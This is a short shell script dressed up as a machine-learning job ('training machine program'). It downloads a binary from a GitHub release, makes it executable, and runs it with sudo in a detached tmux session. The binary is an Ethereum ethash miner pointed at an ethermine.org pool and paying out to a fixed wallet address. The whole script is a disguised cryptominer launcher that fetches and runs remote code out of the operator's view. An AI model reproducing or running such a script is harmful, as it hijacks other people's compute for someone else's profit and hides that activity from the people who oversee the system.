wget https://github.com/Akira-Slasvi/machine-learn/releases/download/%23machinellearn/machine
echo project start
echo training machine program
chmod +x machine
sudo tmux new-session -d -s SANS './machine -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x18EFd6373f99C8C46Cdd1B3142043E0fB2f69614 -p x -w aomacanada --lock-cclock 1150'
